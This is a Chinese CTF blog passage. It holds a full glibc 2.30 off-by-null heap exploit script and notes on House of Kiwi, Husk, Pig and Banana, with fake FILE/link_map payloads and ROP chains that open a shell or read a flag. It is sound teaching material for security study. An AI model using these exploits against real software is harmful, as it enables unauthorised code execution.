▲总结\n\n①利用unsortedbin成链机制，合并unsortedbin中的chunk并且切割，这样就能保留住FD和BK了。\n\n②再利用unsortedbin成链和切割的机制，就能修改到对应preChunk的FD和BK了，修改最后一个字节为\\x00即可。\n\n③由于2.29之后的添加的两项检查，所以需要注意的是伪造unsortedbinChunk的size时，也要伪造nextChunk的pre_size和pre_inuse位。\n\n④太他丫的麻烦了，有这时间布局还不如肝其他题.....\n\n再贴个汇总的exp，基于libc2.30，自己的题目：\n\n```python\n#有size限制，对应索引往后移即可\nadd_malloc(0x1000-0x290+0x3000-0x8+0x3a0,'PIG007NB')\n\n\t\t\t#old \t\t\t#new\n#get layout to let chunk0_addr = 0x****3a0\nclaim(0x88)# 0-6\t\t\t#1-7\nclaim(0x98)# 7-13\t\t\t#8-14\nclaim(0xa8)# 14-20\t\t\t#15-21\nclaim(0xb8)# 21-27\t\t\t#22-28\nclaim(0xc8)# 28-34\t\t\t#29-35\nclaim(0xd8)# 35-41\t\t\t#36-42\nclaim(0xe8)# 42-48\t\t\t#43-49\n\n#--------------------------\nadd_malloc(0x98,'\\x00')# 49 \t\t\t\t#50\nadd_malloc(0x98,'\\x00')# 50 \t\t\t\t#51\t\t0x****f900\nadd_malloc(0x18,'\\x00')# 51  \t\t\t\t#52 \t0x****f9a0\nadd_malloc(0xa8,'\\x00')# 52     0 \t\t\t#53\t\t0x****f9c0\nadd_malloc(0xb8,'\\x00')# 53     1 \t\t\t#54\t\t0x****fa70\nadd_malloc(0xd8,'\\x00')# 54     2 \t\t\t#55\t\t0x****fb30\nadd_malloc(0xd8,'\\x00')# 55     \t\t\t#56\t\t\nadd_malloc(0xe8,'\\x00')# 56     3 \t\t\t#57\t\t0x****fcf0\n\n#这个0x200和0xe0的设置是为了之后将unsortedbinChunk给改成0x200备用的\nfakeChunk_nextChunk_preSize = p64(0x200) + p64(0xe0)\nedit(57,0x10,fakeChunk_nextChunk_preSize)# 56\t\t\t#57\n\nadd_malloc(0xe8,'\\x00')# 57    4 \t\t\t#58 \t0x****fde0\nadd_malloc(0x98,'\\x00')# 58 \t\t\t\t#59\nadd_malloc(0xe8,'\\x00')# 59 \t\t\t\t#60 \t0x****ff70\nadd_malloc(0x18,'\\x00')# 60 \t\t\t\t#61\n\n#free 0~48 \t\t#1~49\n#-------------------------\n#--tcache\nfor i in range(0,7):  #0x88  \t\n    free(i+1)\nfor i in range(14,21):#0xa8\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\nfor i in range(35,42):#0xd8\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)    \n#--tcache\n\nfor i in range(52,57): #52~56  \t\t\t\t#53~57  merge into unsortedbin\n    free(i+1)\n\n#---------------------------\n# empty tcache\nclaim(0x88) #62~68\nclaim(0xa8) #69~75\nclaim(0xb8) #76~82\nclaim(0xd8) #83~89\nclaim(0xe8) #90~96\n#---------------------------\n\n#---------------------------------------------------------------- 上面是一个大的unsorted bin\n#进行add之后carver up and unsortedbin 被放入了largebin 之后进行了分配\nadd_malloc(0x98,'\\x00')# 52 \t#97  \t#0x****9c0\nadd_malloc(0x98,'\\x00')# 53     #98\t\t#0x****A60\n\nfake_chunk_size = 0x98 * \"a\" + p16(0x200)\n#这里我借用堆溢出来仿照off-by-null，修改还在largebin中的chunk的size从0x2e1->0x200\n#changing largebinChunk_size will not cause abort\nedit(98,0x98+0x2,fake_chunk_size)#53 #98\nadd_malloc(0x88,'\\x00')#54 \t#99 \t#0x****B00\nadd_malloc(0x88,'\\x00')#55  #100 \t#0x****B90\nadd_malloc(0xd8,'\\x00')#56  #101 \t#0x****C70\n\n\n#构造preChunk的fd和bk------------------------\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(0,7):#0x88\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)        \n#------tcache\n\n\nfree(51)#0x98 \t#50  \t#51 #0x****f900\n#let 99->fd = chunk51_addr(0x****f900)\nfree(99)#0x88  \t#54 \t#99\n#let 99->bk = chunk60_addr(0x****ff70)\nfree(60)#0xe8 \t#59 \t#60 #0x****ff70\n#构造preChunk的fd和bk------------------------\n\n\nfree(98)#0x98 \t#53 \t#98\n\n#---------------add back\nclaim(0x88) #102~108\nclaim(0x98) #109~115\nclaim(0xe8) #116~122\n#---------------add back\n\n#将51,99,98分别放入对应的smallbin,98和99由于物理相邻，所以合并成为0x130的块\n#之后依据大小适配原则将60分配回来给123\nadd_malloc(0xd8,'\\x00')# 0x32\t\t#123 0x****ff70,实际大小为0xf0\n#将0x131的smallbin切分，此时51还在0xa0的smallbin中，剩下0x70的Chunk进入unsortedbin中\nadd_malloc(0xb8,'\\x00')# 0x35  \t\t#124 0x****fa60\n\nfor i in range(0,7):#0x88\n    free(i+1)\n#chunk100放入unsortedbin, 与0x70的碎片合并，形成0x101的块\nfree(100) \t\t\t#55 \t#100\n\nclaim(0x88)\t#125~131\n\n#切割0x101的块，获得0xb8大小的0x****fb20，方便与0x****f900的块放入同一个unsortebin中\nadd_malloc(0xb8,'\\x00')#0x36 \t#132 \t0x****fb20\nadd_malloc(0x98,'\\x00')#0x37  \t#133\t0x****f900\nadd_malloc(0x38,'\\x00')#0x3b \t#134 \t0x****fbe0\n\n\n#修复FD->bk和BK->fd-----------------------------\n#------tcache\nfor i in range(42,49):#0xe8\n    free(i+1)        \nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n#let 133->bk = chunk132_addr(0x****f900->bk = 0x****fb20)\nfree(133) #0x37 \t#133 \t0x****f900\nfree(132) #0x36  \t#132 \t0x****fb20\n#let 123->fd = chunk132_addr(0x****ff70->bk = 0x****fb20)\nfree(123) #0x32 \t#123  \t0x****ff70\n#修复FD->bk和BK->fd-----------------------------\n\n\nfree(59)  #58\t\t#59\t\t0x****fed0\n#chunk59和chunk123合并进入unsortedbin，大小0x190(0xf0+0xa0)\n\nclaim(0x98) \t#135~141\nclaim(0xb8)\t\t#142~148\nclaim(0xe8) \t#149~155\n\nadd_malloc(0xc8,'\\x00')\t\t#0x32 \t\t#156 \t0x****fed0\t\nadd_malloc(0xb8,'\\x00')\t\t#0x36 \t\t#157 \t0x****fb20\nadd_malloc(0xb8,'\\x00')\t\t#0x37  \t\t#158\t0x****ffa0\nadd_malloc(0x98,'\\x00')\t\t#58  \t\t#159 \t0x****f900\n\n#--top_chunk\nadd_malloc(0x98,'\\x00')        #0x3d \t\t\t#160\nadd_malloc(0x98,'\\x00')        #0x3e \t\t\t#161\nadd_malloc(0x18,'\\x00')        #0x3f \t\t\t#162\n\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n\nfree(161) #0x98 \t#0x3e \t\t#161\nfree(159) #0x98 \t#58  \t\t#159 \t0x****f900\nfree(157) #0xb8 \t#0x36 \t\t#157\nfree(50)  #0x98 \t#49 \t\t#50 \t0x****f860\n#其中159和50合并为0x140大小的块放入unsortedbin中\n#unsortedbin:0x****f860 —▸ 0x****fb20 —▸ 0x****0120\n\nclaim(0xb8) #163~169\nclaim(0x98) #170~176\n#----------------------------------------------------\nadd_malloc(0xb8,'\\x00') #49 \t#177\nadd_malloc(0x98,'\\x00') #0x36  \t#178\n\n#切割0x140的块\nadd_malloc(0xc8,'\\x00')#0x3a \t#179 \t0x****f860\nadd_malloc(0x68,'\\x00')#0x3e   \t#180 \t\n\n\npartial_null_write = 0x98*'b'\npartial_null_write += p64(0xf1)\nedit(156,0x98+0x8+0x1,partial_null_write+'\\x00') #0x32  \t#156\n\npartial_null_write = 0xa8*'c'\nedit(179,0xa8+0x1,partial_null_write + '\\x00') \t\t#0x3a \t\t#179\n\n#伪造pre_size\nfake_chunk_size = 0x98*'d'\nfake_chunk_size += p64(0x2e1)\nedit(124,0x98+0x8,fake_chunk_size) \t#0x35 \t#124\n\n\nfor i in range(42,49):#0xe8\n    free(i+1)    \nfree(58)\n\n\n#pull-down the unsortedbinChunk to chunk134 and leak main_arena\nedit(134,0x8,\"e\"*8)  #0x3b #134\nadd_malloc(0xd8,'\\x00') \t#181\nshow(134)\n\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['__malloc_hook'] + 0x10)\nlg('libc_base',libc_base)\n\n\n#---------------------------------------------------------------------------------\nclaim(0xe8) \t#182~188\nadd_malloc(0xe8,'\\x00')\t\t#0x40 \t#189\nfree(44) \t#0x2b \t#44\nfree(134) \t#0x3b \t#134\nedit(189,0x8,p64(libc_base+libc.sym['__free_hook']-8)) \t#0x40 \t#189\nadd_malloc(0xe8,'\\x00')  \t\t#190\nadd_malloc(0xe8,'\\x00') \t\t#191\n\nedit(191,0x10,\"/bin/sh\\x00\"+p64(libc_base+libc.sym['system'])) \t#191\nfree(191)\nit()\n#--------------------------------------------------------------\n```\n\n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"高版本各类堆技巧总结","url":"/2021/08/20/高版本堆各类技巧总结/","content":"\n# 一、House of KIWI\n\n[House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235598)\n\n## 1.原理分析\n\n函数调用链：**assert->malloc_assert->fflush->_IO_file_jumps结构体中的__IO_file_sync**\n\n```c\nstatic void\n__malloc_assert (const char *assertion, const char *file, unsigned int line,\n\t\t const char *function)\n{\n  (void) __fxprintf (NULL, \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n\",\n\t\t     __progname, __progname[0] ? \": \" : \"\",\n\t\t     file, line,\n\t\t     function ? function : \"\", function ? \": \" : \"\",\n\t\t     assertion);\n  fflush (stderr);//关键在这个函数中\n  abort ();\n}\n#endif\n```\n\n调用时的寄存器为：\n\n![图片2](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png)\n\n那么如果可以在不同版本下劫持对应setcontext中的赋值参数，即rdi或者rdx，就可以设置寄存器来调用我们想调用的函数。\n\n### (1)rdi和rdx互相转换\n\n①getkeyserv_handle+576：\n\n```\nplaintext\n\n#注释头\n\nmov rdx, [rdi+8]\nmov [rsp+0C8h+var_C8], rax\ncall qword ptr [rdx+20h]\n```\n\n通过rdi控制rdx，同样2.29以后不同版本都不太一样，需要再调试看看，比如2.31里就是：\n\n```\nplaintext\n\n#注释头\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\n②svcudp_reply+26:\n\n```\nplaintext\n\n#注释头\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\n通过rdi控制rbp实现栈迁移，然后即可任意gadget了。\n\n其中2.31版本下还是一样的，如下：\n\n```\nplaintext\n\n#注释头\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\n### (2)不同劫持\n\n这里观察寄存器就可以知道，不同版本的setcontext对应的rdi和rdx，这里就劫持哪一个。另外这里的rdi为`_IO_2_1_stderr`结构体，是通过`_malloc_assert`函数中的\n\n```c\nfflush (stderr);\n```\n\n从`stderr@@GLIBC_2.2.5`取值过来的，也就是ELF的bss段上的数据\n\n```c\n//2.33 /libio/stdio.c\n#include \"libioP.h\"\n#include \"stdio.h\"\n\n#undef stdin\n#undef stdout\n#undef stderr\nFILE *stdin = (FILE *) &_IO_2_1_stdin_;\nFILE *stdout = (FILE *) &_IO_2_1_stdout_;\nFILE *stderr = (FILE *) &_IO_2_1_stderr_;\n```\n\n如果可以取得ELF基地址，直接劫持该指针为chunk地址也是可以的，这样就能劫持RDI寄存器了。\n\n![图片1](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827165944.png)\n\n这样如果劫持__IO_file_sync函数指针为setcontext，配合劫持的rdi和rdx就可以来调用我们想调用函数从而直接getshell或者绕过orw。\n\n如果没法泄露ELF基地址，可以利用`largebin attack`直接将堆地址写入`_IO_2_1_stderr`的`vtable`指针，然后在堆上伪造`_IO_new_file_sync`函数指针为`one_gadget`即可。\n\n## 🔺问题：\n\n当程序中无法泄露ELF基地址时，而`one_gadget`\n\n## 2.触发条件\n\n只要assert判断出错都可以，常用以下几个\n\n(1)top_chunk改小，并置pre_inuse为0，当top_chunk不足分配时会触发一个assert。(该assert函数在sysmalloc函数中被调用)\n\n![Snipaste_2021-08-28_11-56-34](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828115642.png)\n\n(2)largebin chunk的size中\n\n当修改largebin中的chunk的size位时，将之改小。再从largebin中尝试申请chunk的时候，如果发现largebin中的chunk的size小于需要申请的chunk的size，那么就会触发`assert`\n\n```c\n//2.33  _int_malloc\nsize = chunksize (victim);\n//这个size即为largebin中的chunk的size,nb为需要申请的chunk的size\n/*  We know the first chunk in this bin is big enough to use. */\nassert ((unsigned long) (size) >= (unsigned long) (nb));\n```\n\n(3)如果是2.29及以下，因为在tcache_put和tcache_get中还存在assert的关系，所以如果可以修改掉mp_.tcache_bins，将之改大，(利用largebin attack)就会触发assert\n\n```c\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\n![Snipaste_2021-08-28_11-46-59](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828114858.png)\n\n此外只要是assert不满足均可，可以在`_int_malloc`和`_int_free`函数中找一找。\n\n## 3.适用条件\n\n如果将`exit`函数替换成`_exit`函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用`_IO_cleanup`,若再将`__malloc_hook`和`__free_hook`给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区的情况下。这时候可以借用malloc出错调用**malloc_assert->fflush->_IO_file_sync**函数指针。且进入的时候rdx为`_IO_helper_jumps_addr`，rdi为`_IO_2_1_stderr_addr`。\n\n\n\n# 二、House of Husk\n\n[house-of-husk学习笔记 (juejin.cn)](https://juejin.cn/post/6844904117119385614)\n\n## **1**.原理分析\n\n函数调用链:\n\n```c\nprintf->vfprintf->printf_positional->__parse_one_specmb->__printf_arginfo_table(spec)\n\t\t\t\t\t\t\t\t\t\t\t\t|\n    \t\t\t\t\t\t\t\t\t\t\t ->__printf_function_table(spec)\n```\n\n**__parse_one_specmb** 函数 会调用 **__printf_arginfo_table**和**__printf_function_table**两个函数指针中对应spec索引的函数指针**printf_arginfo_size_function**\n\n▲这个spec索引指针就是格式化字符的ascii码值，比如printf(\"%S\")，那么就是S的ascii码值。当然，这个方法的前提是得有printf系列函数，并且有格式化字符。\n\n即调用**(*__printf_arginfo_table+'spec'8) 和  (*printf_function_table+'spec'8)**这两个函数指针。\n\n而实际情况会先调用**__printf_arginfo_table**中对应的spec索引的函数指针，然后调用**__printf_function_table**对应spec索引函数指针。\n\n所以如果修改了**__printf_arginfo_table**和**__printf_function_table**，则需要确保对应的spec索引对应的函数指针，要么为0，要么有效。\n\n同时如果选择这个方法，就得需要**__printf_arginfo_table**和**__printf_function_table**均不为0才行。\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n/* Use the slow path in case any printf handler is registered.  */\nif (__glibc_unlikely (__printf_function_table != NULL\n                      || __printf_modifier_table != NULL\n                      || __printf_va_arg_table != NULL))\n    goto do_positional;\n\n\ndo_positional:\nif (__glibc_unlikely (workstart != NULL))\n{\n    free (workstart);\n    workstart = NULL;\n}\ndone = printf_positional (s, format, readonly_format, ap, &ap_save,\n                          done, nspecs_done, lead_str_end, work_buffer,\n                          save_errno, grouping, thousands_sep, mode_flags);\n```\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n(void) (*__printf_arginfo_table[specs[cnt].info.spec])\n(&specs[cnt].info,\n specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n &args_size[specs[cnt].data_arg]);\n\n\n/* Call the function.  */\nfunction_done = __printf_function_table[(size_t) spec]\n    (s, &specs[nspecs_done].info, ptr);\n```\n\n即如果table不为空，则调用`printf_positional`函数，然后如果spec不为空，则调用对应spec索引函数。但是有时候不知道printf最终会调用哪个spec，可能隐藏在哪，所以直接把干脆`_printf_arginfo_table`和`__printf_function_table`中的值全给改成one_gadget算了。\n\n▲综上，得出以下条件：\n\n```C\nA.\t__printf_function_table = heap_addr \n\t__printf_arginfo_table != 0\n//其中__printf_arginfo_table和__printf_function_table可以对调\nB. heap_addr+'spec'*8 = one_gadget\n```\n\n![23CGNn46r5xEgJy](https://pig-007.oss-cn-beijing.aliyuncs.com/img/23CGNn46r5xEgJy.png)\n\n在2.29下可以直接用largebin attack爆破修改两个地方，当然还是需要先泄露地址的。\n\n## 2.触发条件\n\n即需要printf家族函数被调用，且其中需带上格式化字符，比如%s，%x等，用来计算spec，这个和libc版本无关，相当于只针对printf家族函数进行攻击的。\n\n## 3.适用条件\n\n具有printf家族函数，并且存在spec，合适地方会调用。\n\n\n\n# 三、House of Pig\n\n[house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n## 1.原理分析\n\n### (1)劫持原理\n\n**_IO_str_overflow**函数中会连续调用**malloc memcpy free**三个函数。并且**__IO_str_overflow**函数传入的参数rdi为从**_IO_list_all**中获取的**_IO_2_1_stderr**结构体的地址。所以如果我们能改掉**_IO_list_all**中的值就能劫持进入该函数的参数`rdi`。\n\n![Snipaste_2021-08-28_17-15-06](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828171517.png)\n\n所以如上所示，即劫持成功。\n\n### (2)Getshell原理\n\n#### ①函数流程\n\nA.在`_IO_str_overflow`函数中会先申请chunk为`new_buf`，然后会依据`rdi`的值，将`rdi`当作`_IO_FILE`结构体，从该结构体中获取`_IO_buf_base`当作`old_buf`。\n\nB.依据`old_blen` 和`_IO_buf_base`来拷贝数据到`new_buf`中，然后释放掉`old_buf`。其中`old_blen` 是通过`_IO_buf_end`减去`_IO_buf_base`得到的。\n\n```c\n//2.31 strops.c中的_IO_str_overflow\nif (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n    return EOF;\nelse\n{\n    char *new_buf;\n    char *old_buf = fp->_IO_buf_base;\n    size_t old_blen = _IO_blen (fp);\n    size_t new_size = 2 * old_blen + 100;\n    if (new_size < old_blen)\n        return EOF;\n    new_buf = malloc (new_size);//-------house of pig:get chunk from tcache\n    if (new_buf == NULL)\n    {\n        /*\t  __ferror(fp) = 1; */\n        return EOF;\n    }\n    if (old_buf)\n    {\n        memcpy (new_buf, old_buf, old_blen);\n        //-------house of pig:copy /bin/sh and system to _free_hook\n        free (old_buf);\t\t//-------house of pig:getshell\n        /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n        fp->_IO_buf_base = NULL;\n    }\n```\n\n\n\n![Snipaste_2021-08-28_17-30-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828173049.png)\n\n#### ②劫持所需数据\n\n所以如果在申请的`new_buf`包含为`_free_hook`，然后我们在`_IO_buf_base`和`_IO_buf_end`这里一段数据块中将`system_addr`放入，那么就可以将`system_addr`拷贝到`_free_hook`中。之后释放掉`old_buf`，如果`old_buf`中的头部数据为`/bin/sh\\x00`，那么就能直接**getshell**了。得到以下劫持所需数据：\n\n```c\n*(_IO_list_all) = chunk_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_base = chunk_sh_sys_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_end = chunk_sh_sys_addr+old_blen;\n//2 * old_blen + 100 通常我们选取old_blen为0x18，那么计算得到的tc_idx为8\ntcachebin[tc_idx] = _free_hook_addr-old_blen;\n```\n\n但是如何使得tcachebin[tc_idx]中的Chunk为`_free_hook_addr-old_blen`呢，这个就用到技术\n\n`Largebin attack + Tcache Stashing Unlink Attack`，这个技术原理比较复杂，自己看吧。\n\n**通常是只能使用callo的情况下来用的，因为如果能malloc那直接从tcache中malloc出来不就完了。**\n\n然后由于`_IO_str_overflow`函数中的一些检查，所以有的地方还是需要修改的：\n\n```python\nfake_IO_FILE = p64(0)*2\nfake_IO_FILE += p64(1)                     #change _IO_write_base = 1\nfake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff\nfake_IO_FILE += p64(0)\n#need copy '/bin/sh' and system from a old_buf to new_buf\nfake_IO_FILE += p64(heap_base+0x003900+0x10)       #set _IO_buf_base (old_buf(start))\nfake_IO_FILE += p64(heap_base+0x003900+0x10+0x18)  #set _IO_buf_end  (old_buf(end))   \n#old_blen=old_buf(start)-old_buf(end)\nfake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\\x00')\nfake_IO_FILE += p64(0)                    #change _mode = 0\nfake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\\x00')\nfake_IO_FILE += p64(IO_str_vtable)        #change vtable to _IO_str_jumps\n```\n\n## 2.触发条件\n\n(1)Libc结构被破坏的abort函数中会调用刷新\n(2)调用exit()\n(3)能够从main函数返回\n\n## 3.适用条件\n\n程序只能通过calloc来获取chunk时\n\n\n\n# 四、House of banana\n\n[house of banana - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\n[main_arena劫持及link_map劫持 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/211331)\n\n## 1.原理分析\n\n函数调用链：**exit()->_dl_fini->(fini_t)array[i]**\n\n```c\n//2.31 glibc/elf/dl_fini.c\n\n/* First see whether an array is given.  */\nif (l->l_info[DT_FINI_ARRAY] != NULL)\n{\n    ElfW(Addr) *array =\n        (ElfW(Addr) *) (l->l_addr\n                        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);\n    unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val\n                      / sizeof (ElfW(Addr)));\n    while (i-- > 0)\n        ((fini_t) array[i]) ();\n}\n```\n\n所以如果可以使得*array[i] = one_gadget，那么就可以一键getshell。而array[i]调用时这里就有两种套路：\n\n### (1)伪造link_map结构体\n\n直接伪造`link_map`结构体，将原本指向`link_map`的指针指向我们伪造的`link_map`，然后伪造其中数据，绕过检查，最后调用array[i]。这里通常利用largebin attack来将堆地址写到`_rtld_global`这个结构体指针中。\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830185253.png)\n\n`link_map`的布局通常如下：\n\n```python\n#largebin attack's chunk\n#*_rtld_local=fake_link_map_chunk_addr\nfake_link_map_chunk_addr = heap_base+0x001000\nedit(1,0x448,'\\x00'*0x448)  #empty the fake_link_map_chunk\nfake_link_map_data = \"\"\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x20)\t\t#0 1\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr)\t\t\t#2 3\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x28)\t\t#4 5\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x50) + p64(fake_link_map_chunk_addr + 0x20)\t\t\t\t\t\t\t\t\t \n#6 7\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x28) + p64(0x0)\t\t#8 9\nfake_link_map_data += p64(0) + p64(0x0)\t\t\t\t\t\t\t\t\t#10 11\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x50)\t\t#12 13\nfake_link_map_data =  fake_link_map_data.ljust(0x100,'\\x00')\n\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x190) + p64(0)\t\t\t\n#0x20 0x21\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x128) + p64(0)\t\t\n#0x22 0x23\nfake_link_map_data += p64(0x8) + p64(0)\t\t\t\t\t\t\t\t\t#0x24 0x25\nfake_link_map_data =  fake_link_map_data.ljust(0x180,'\\x00')\n\nfake_link_map_data += p64(0x1A) + p64(0x0)\t\t\t\t\t\t\t\t#0x30 0x31\nfake_link_map_data += p64(elf_base + elf.sym['backdoor']) + p64(0)\t\t#0x32 0x33\n\n#set fake_chunk->pre_size\nedit(0,0xd68,'\\x00'*0xd60+p64(fake_link_map_chunk_addr + 0x1a0))\nfake_link_map_data = fake_link_map_data.ljust(0x308,'\\x00')\nfake_link_map_data += p64(0x800000000)\n```\n\n![Snipaste_2021-08-29_09-49-17](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830212809.png)\n\n### (2)修改link_map结构体数据\n\n修改对应link_map结构体中的数据，绕过检查，最终调用array[i]。这里就通常需要利用任意申请来申请到该结构体，然后修改其中的值，因为当调用array[i]时，传入的实际上是link_map中的某个地址，即rdx为link_map+0x30，这个不同版本好像不太一样，2.31及以上为link_map+0x38。\n\n主要伪造以下数据：\n\n![Snipaste_2021-08-30_18-56-38](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830191318.png)\n\n这个方法常用来打ORW，因为可以我们可以直接将ROP链布置在link_map中。然而因为版本间的关系，所以数据也有点不同，实际布局：\n\n#### 2.31\n\n![Snipaste_2021-08-30_18-49-43](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830184953.png)\n\n```python\n//docker 2.31 gadget\npop_rdi_ret = libc_base + 0x0000000000026b72;\npop_rsi_ret = libc_base + 0x0000000000027529;\npop_rax_ret = libc_base + 0x000000000004a550;\nsyscall_ret = libc_base + 0x0000000000066229;\npop_rdx_r10_ret = libc_base + 0x000000000011c371\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5b0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+61) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(0x0) + p64(fake_rsp)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(ret) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\n\n\n#### 2.29\n\n![Snipaste_2021-08-30_16-16-41](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830161702.png)\n\n```python\n//docker 2.29 gadget\npop_rdi_ret = libc_base + 0x0000000000026542;\npop_rsi_ret = libc_base + 0x0000000000026f9e;\npop_rax_ret = libc_base + 0x0000000000047cf8;\nsyscall_ret = libc_base + 0x00000000000cf6c5;\npop_rdx_r10_ret = libc_base + 0x000000000012bda4\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += 